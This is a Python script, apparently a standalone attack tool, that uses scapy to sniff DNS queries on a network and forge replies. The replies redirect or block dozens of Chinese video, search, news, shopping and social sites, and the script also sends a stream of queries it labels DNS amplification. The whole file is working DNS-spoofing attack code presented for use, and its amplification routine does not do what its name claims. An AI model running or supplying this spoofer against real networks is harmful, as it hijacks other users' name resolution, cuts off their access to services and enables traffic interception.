#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
国内平台专用DNS攻击工具
专门针对国内电视平台、搜索引擎和传媒平台
"""

import threading
import time
from scapy.all import *

class ChinaPlatformDNSAttack:
    def __init__(self):
        self.attack_running = False
        self.spoof_count = 0
        
        # 国内平台重定向规则
        self.china_platforms = {
            # 电视平台
            "iqiyi.com": "1.1.1.1",           # 爱奇艺 -> Cloudflare
            "youku.com": "8.8.8.8",           # 优酷 -> 谷歌DNS
            "tencent.com": "208.67.222.222",  # 腾讯视频 -> OpenDNS
            "mgtv.com": "1.1.1.1",           # 芒果TV -> Cloudflare
            "bilibili.com": "8.8.8.8",       # B站 -> 谷歌DNS
            "douyin.com": "208.67.222.222",   # 抖音 -> OpenDNS
            "kuaishou.com": "1.1.1.1",       # 快手 -> Cloudflare
            "huya.com": "8.8.8.8",           # 虎牙直播 -> 谷歌DNS
            "douyu.com": "208.67.222.222",    # 斗鱼直播 -> OpenDNS
            "pptv.com": "1.1.1.1",           # PPTV -> Cloudflare
            
            # 搜索引擎
            "baidu.com": "8.8.8.8",          # 百度 -> 谷歌DNS
            "sogou.com": "1.1.1.1",          # 搜狗 -> Cloudflare
            "so.com": "208.67.222.222",      # 360搜索 -> OpenDNS
            "bing.com": "8.8.8.8",           # 必应 -> 谷歌DNS
            "google.com": "1.1.1.1",         # 谷歌 -> Cloudflare
            "yahoo.com": "208.67.222.222",   # 雅虎 -> OpenDNS
            
            # 传媒平台
            "sina.com.cn": "8.8.8.8",        # 新浪 -> 谷歌DNS
            "sohu.com": "1.1.1.1",           # 搜狐 -> Cloudflare
            "163.com": "208.67.222.222",     # 网易 -> OpenDNS
            "qq.com": "8.8.8.8",             # 腾讯网 -> 谷歌DNS
            "ifeng.com": "1.1.1.1",          # 凤凰网 -> Cloudflare
            "people.com.cn": "208.67.222.222", # 人民网 -> OpenDNS
            "xinhuanet.com": "8.8.8.8",      # 新华网 -> 谷歌DNS
            "cctv.com": "1.1.1.1",           # 央视网 -> Cloudflare
            "china.com": "208.67.222.222",   # 中华网 -> OpenDNS
            
            # 新闻客户端
            "toutiao.com": "8.8.8.8",        # 今日头条 -> 谷歌DNS
            "weibo.com": "1.1.1.1",          # 微博 -> Cloudflare
            "zhihu.com": "208.67.222.222",   # 知乎 -> OpenDNS
            "tieba.baidu.com": "8.8.8.8",    # 百度贴吧 -> 谷歌DNS
            "douban.com": "1.1.1.1",         # 豆瓣 -> Cloudflare
            "xiaohongshu.com": "208.67.222.222", # 小红书 -> OpenDNS
            
            # 电商平台
            "taobao.com": "8.8.8.8",         # 淘宝 -> 谷歌DNS
            "tmall.com": "1.1.1.1",          # 天猫 -> Cloudflare
            "jd.com": "208.67.222.222",      # 京东 -> OpenDNS
            "pinduoduo.com": "8.8.8.8",      # 拼多多 -> 谷歌DNS
            "suning.com": "1.1.1.1",         # 苏宁 -> Cloudflare
            "dangdang.com": "208.67.222.222", # 当当 -> OpenDNS
            
            # 社交平台
            "weixin.qq.com": "8.8.8.8",      # 微信 -> 谷歌DNS
            "qzone.qq.com": "1.1.1.1",       # QQ空间 -> Cloudflare
            "renren.com": "208.67.222.222",   # 人人网 -> OpenDNS
            "kaixin.com": "8.8.8.8",         # 开心网 -> 谷歌DNS
        }
        
        # 屏蔽列表（重定向到无效IP）
        self.blocked_sites = [
            "iqiyi.com", "youku.com", "tencent.com", "mgtv.com",
            "bilibili.com", "douyin.com", "kuaishou.com"
        ]
    
    def china_platform_spoofing(self):
        """国内平台DNS欺骗"""
        print("🎯 启动国内平台DNS欺骗")
        print("💡 专门针对国内电视、搜索、传媒平台")
        
        def china_spoof(pkt):
            if pkt.haslayer(DNSQR):
                domain = pkt[DNS].qd.qname.decode('utf-8', errors='ignore').rstrip('.')
                
                # 检查是否在国内平台列表中
                redirect_ip = None
                platform_type = "其他"
                
                # 分类检查
                for platform, ip in self.china_platforms.items():
                    if platform in domain:
                        redirect_ip = ip
                        
                        # 分类平台类型
                        if "iqiyi" in platform or "youku" in platform or "bilibili" in platform:
                            platform_type = "电视平台"
                        elif "baidu" in platform or "sogou" in platform or "so.com" in platform:
                            platform_type = "搜索引擎"
                        elif "sina" in platform or "sohu" in platform or "163" in platform:
                            platform_type = "传媒平台"
                        elif "taobao" in platform or "jd" in platform or "pinduoduo" in platform:
                            platform_type = "电商平台"
                        elif "weibo" in platform or "zhihu" in platform or "toutiao" in platform:
                            platform_type = "社交平台"
                        
                        break
                
                # 如果在屏蔽列表中，重定向到无效IP
                if any(blocked in domain for blocked in self.blocked_sites):
                    redirect_ip = "127.0.0.1"
                    platform_type = "屏蔽网站"
                
                # 创建DNS响应
                if redirect_ip:
                    spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                                 UDP(dport=pkt[UDP].sport, sport=53)/\
                                 DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                                     an=DNSRR(rrname=pkt[DNS].qd.qname, type='A', 
                                             ttl=600, rdata=redirect_ip))
                    
                    send(spoofed_pkt, verbose=False)
                    
                    self.spoof_count += 1
                    
                    # 根据平台类型显示不同颜色
                    if platform_type == "电视平台":
                        print(f"📺 电视平台拦截: {domain} -> {redirect_ip}")
                    elif platform_type == "搜索引擎":
                        print(f"🔍 搜索引擎重定向: {domain} -> {redirect_ip}")
                    elif platform_type == "传媒平台":
                        print(f"📰 传媒平台拦截: {domain} -> {redirect_ip}")
                    elif platform_type == "电商平台":
                        print(f"🛒 电商平台重定向: {domain} -> {redirect_ip}")
                    elif platform_type == "社交平台":
                        print(f"💬 社交平台拦截: {domain} -> {redirect_ip}")
                    elif platform_type == "屏蔽网站":
                        print(f"🚫 网站屏蔽: {domain} -> {redirect_ip} (本地回环)")
                    else:
                        print(f"🔧 DNS欺骗 [{self.spoof_count}]: {domain} -> {redirect_ip}")
                    
                    # 统计显示
                    if self.spoof_count % 15 == 0:
                        print(f"📊 统计: 已成功欺骗 {self.spoof_count} 个DNS查询")
        
        try:
            sniff(filter="udp port 53", prn=china_spoof, store=0)
        except Exception as e:
            print(f"❌ 国内平台DNS欺骗失败: {e}")
    
    def china_dns_amplification(self):
        """国内平台DNS放大攻击"""
        print("🎯 启动国内平台DNS放大攻击")
        
        def send_china_queries():
            query_count = 0
            china_domains = list(self.china_platforms.keys())
            
            while self.attack_running and query_count < 300:
                try:
                    import random
                    domain = random.choice(china_domains)
                    
                    # 发送DNS查询
                    dns_query = IP(dst="8.8.8.8")/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=domain))
                    send(dns_query, verbose=False)
                    
                    query_count += 1
                    
                    if query_count % 50 == 0:
                        print(f"📡 已发送 {query_count} 个国内平台DNS查询")
                    
                    time.sleep(0.1)
                    
                except Exception as e:
                    print(f"❌ DNS查询发送失败: {e}")
                    time.sleep(1)
        
        query_thread = threading.Thread(target=send_china_queries)
        query_thread.daemon = True
        query_thread.start()
    
    def platform_statistics(self):
        """平台统计功能"""
        print("📈 国内平台统计信息")
        print("=" * 50)
        
        # 分类统计
        tv_platforms = [k for k in self.china_platforms.keys() if "iqiyi" in k or "youku" in k or "bilibili" in k]
        search_engines = [k for k in self.china_platforms.keys() if "baidu" in k or "sogou" in k or "so.com" in k]
        media_platforms = [k for k in self.china_platforms.keys() if "sina" in k or "sohu" in k or "163" in k]
        ecommerce_platforms = [k for k in self.china_platforms.keys() if "taobao" in k or "jd" in k or "pinduoduo" in k]
        social_platforms = [k for k in self.china_platforms.keys() if "weibo" in k or "zhihu" in k or "toutiao" in k]
        
        print(f"📺 电视平台 ({len(tv_platforms)}个): {', '.join(tv_platforms[:5])}...")
        print(f"🔍 搜索引擎 ({len(search_engines)}个): {', '.join(search_engines)}")
        print(f"📰 传媒平台 ({len(media_platforms)}个): {', '.join(media_platforms[:5])}...")
        print(f"🛒 电商平台 ({len(ecommerce_platforms)}个): {', '.join(ecommerce_platforms[:5])}...")
        print(f"💬 社交平台 ({len(social_platforms)}个): {', '.join(social_platforms[:5])}...")
        print(f"🚫 屏蔽网站 ({len(self.blocked_sites)}个): {', '.join(self.blocked_sites)}")
        print("=" * 50)
    
    def run_china_platform_attack(self):
        """运行国内平台攻击"""
        print("=" * 70)
        print("          国内平台专用DNS攻击工具")
        print("=" * 70)
        
        # 显示平台统计
        self.platform_statistics()
        
        print("\n💡 专门针对国内电视平台、搜索引擎和传媒平台")
        print("💡 智能分类 + 平台屏蔽 + DNS放大")
        
        self.attack_running = True
        
        # 创建攻击线程
        threads = []
        
        # 国内平台DNS欺骗
        t1 = threading.Thread(target=self.china_platform_spoofing)
        threads.append(t1)
        
        # 国内平台DNS放大
        t2 = threading.Thread(target=self.china_dns_amplification)
        threads.append(t2)
        
        # 启动所有线程
        for t in threads:
            t.daemon = True
            t.start()
        
        print("\n⏰ 国内平台DNS攻击运行中...")
        print("💡 按 Ctrl+C 停止攻击")
        print("\n攻击功能:")
        print("📺 电视平台拦截 (爱奇艺、优酷、B站等)")
        print("🔍 搜索引擎重定向 (百度、搜狗、360等)")
        print("📰 传媒平台拦截 (新浪、搜狐、网易等)")
        print("🛒 电商平台重定向 (淘宝、京东、拼多多等)")
        print("💬 社交平台拦截 (微博、知乎、今日头条等)")
        print("🚫 网站屏蔽功能 (指定平台完全屏蔽)")
        
        try:
            while self.attack_running:
                time.sleep(1)
        except KeyboardInterrupt:
            self.stop_attack()
        
        print("\n✅ 国内平台DNS攻击已停止")
        print(f"📊 总共欺骗了 {self.spoof_count} 个DNS查询")
    
    def stop_attack(self):
        """停止攻击"""
        self.attack_running = False
        print("\n🛑 停止国内平台DNS攻击")

def main():
    """主函数"""
    attack = ChinaPlatformDNSAttack()
    
    try:
        attack.run_china_platform_attack()
    except KeyboardInterrupt:
        attack.stop_attack()
    except Exception as e:
        print(f"❌ 攻击失败: {e}")

if __name__ == "__main__":
    main()